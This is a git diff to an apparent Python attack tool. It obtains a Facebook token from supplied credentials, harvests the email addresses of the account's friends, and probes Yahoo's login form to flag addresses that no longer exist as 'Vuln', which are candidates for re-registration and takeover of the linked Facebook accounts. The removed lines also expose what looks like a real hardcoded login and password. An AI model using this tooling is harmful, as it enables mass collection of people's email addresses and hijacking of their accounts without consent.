@@ -3,6 +3,9 @@ import hashlib
 import sys
 import time
 import json
+from bs4 import BeautifulSoup
+import mechanize
+
 
 def generatefbtoken(id,password):
     pwd = password
@@ -51,20 +54,42 @@ def getemailfriendfb(token):
     
     return arrayemail
 
-def emailvalid(email):
+def yahooemail(em):
+
+    br = mechanize.Browser()
+    br.set_handle_robots(False)
+    br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+    br._factory.is_html = True
+    br.select_form(nr=0)
+    br["username"] = (em)
+    soup = BeautifulSoup(br.submit().read(), features="html.parser")
+    status = soup.find_all("p")
+    vuln = ("\033[31mNot Vuln")
+    for p in status:
+        try:
+            if (p.get("data-error") == "messages.ERROR_INVALID_USERNAME"):
+                vuln = ("\033[32mVuln")
+                break
+        except:
+            pass
+    len_email = (27-len(em))
+    if (vuln == "\033[32mVuln"):
+        len_vuln = (19-(len(vuln)-8))
+        print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-10)*" "+vuln+(len_vuln-10)*" "+"\033[36m|")
+    # else:
+    #     len_vuln = (19-(len(vuln)-8))
+    #     print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-7)*" "+vuln+(len_vuln-9)*" "+"\033[36m|")
 
 if __name__ == '__main__':
-   token = generatefbtoken('akubukanhejes','Systemcodedx(^_^)321~~~~Q~1')
-   if token is None:
-       sys.exit("INVALID TOKEN")
-   list_email = getemailfriendfb(token)
-   count = 0
-   for email in list_email:
-       if '@yahoo' in email:
-            print(email)
+    token = generatefbtoken('email sini','password sini')
+    if token is None:
+        sys.exit("INVALID TOKEN")
+    list_email = getemailfriendfb(token)
+    for email in list_email:
+        if '@yahoo' in email:
+            # print(email)
+            yahooemail(email)
+            time.sleep(2)
+            
 
-            # emailvalid(email)
-            # count+=1
-            # # time.sleep(2)
-            # # if(count==10):
-            # #     sys.exit(1)
+    
